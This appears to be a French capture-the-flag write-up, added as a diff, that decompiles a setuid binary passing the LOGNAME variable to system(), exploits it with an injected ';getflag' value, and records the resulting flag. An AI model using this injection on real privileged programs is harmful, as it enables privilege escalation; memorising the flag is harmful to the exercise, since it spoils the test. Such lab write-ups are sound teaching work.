@@ -1,0 +1,35 @@
+Un binaire.
+On ouvre un decompiler et on le met dedans, ca donne le code dont :
+
+
+int main(int argc,char **argv,char **envp)
+
+{
+  char *pcVar1;
+  int iVar2;
+  char *local_1c;
+  __gid_t local_18;
+  __uid_t local_14;
+
+                    // Unresolved local var: char * buffer@[DW_OP_breg4(ESP): +20]
+                    // Unresolved local var: gid_t gid@[DW_OP_breg4(ESP): +24]
+                    // Unresolved local var: uid_t uid@[DW_OP_breg4(ESP): +28]
+  local_18 = getegid();
+  local_14 = geteuid();
+  setresgid(local_18,local_18,local_18);
+  setresuid(local_14,local_14,local_14);
+  local_1c = (char *)0x0;
+  pcVar1 = getenv("LOGNAME");
+  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
+  iVar2 = system(local_1c);
+  return iVar2;
+}
+
+On voit qu'il va chercher l'env LOGNAME, puis ensuitel a stocker dans local_1c,
+et l'executer avec system(), donc il nous suffit de faire une injection.
+
+export LOGNAME=";getflag"
+
+On termine la string precedente avec ; et on le force a utiliser getflag.
+
+Tada ; fiumuikeil55xe9cu4dood66h
